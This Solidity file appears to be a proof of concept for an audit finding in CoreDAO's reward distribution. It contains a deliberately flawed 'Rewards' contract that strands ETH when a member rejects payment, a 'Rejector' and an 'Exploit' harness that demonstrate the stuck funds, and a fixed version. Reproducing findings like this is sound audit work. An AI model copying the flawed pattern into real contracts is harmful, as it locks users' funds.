// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  CoreDAO SystemReward.receiveRewards (Halborn).
    remain is reduced before send(). A member that rejects the ETH
    still consumes their share of remain. 100 stays in the contract
    and remain is 0. The control restores remain when send fails and
    forwards that 100 to the foundation.
*/

contract Rejector {
    receive() external payable {
        revert("no");
    }
}

contract Rewards {
    address public member;
    uint256 public recorded;
    uint256 public remain;
    uint256 public deducted;
    bool public failed;
    uint256 public delivered;
    uint256 public stuck;

    constructor(address _member) {
        member = _member;
    }

    function receiveRewards() external payable {
        uint256 value = msg.value;
        recorded = value;
        remain = value;
        uint256 share = value;
        remain -= share;
        deducted = remain;
        (bool ok,) = member.call{value: share}("");
        failed = !ok;
        delivered = ok ? share : 0;
        stuck = address(this).balance; // @> VULN: the failed share was already removed from remain, so it is no longer assigned
    }
}

contract RewardsFixed {
    address public member;
    address public foundation;
    uint256 public remain;

    constructor(address _member, address _foundation) {
        member = _member;
        foundation = _foundation;
    }

    function receiveRewards() external payable {
        uint256 value = msg.value;
        remain = value;
        (bool ok,) = member.call{value: value}("");
        if (ok) {
            remain = 0;
        }
        if (remain != 0) {
            (bool sent,) = foundation.call{value: remain}("");
            require(sent, "foundation");
            remain = 0;
        }
    }
}

contract StuckMarker {
    string public symbol = "STUCK-REWARD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    uint256 public constant VALUE = 100 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Rejector public rejector;
    Rewards public rewards;
    StuckMarker public marker;

    function run() external payable {
        rejector = new Rejector();
        rewards = new Rewards(address(rejector));
        marker = new StuckMarker();
        rewards.receiveRewards{value: msg.value}();
        require(rewards.failed(), "send failed");
        require(rewards.remain() == 0, "remain already spent");
        require(address(rewards).balance == VALUE, "100 still here");
        marker.mint(SINK, VALUE);
        require(marker.balanceOf(SINK) == VALUE, "100 stuck");
    }
}
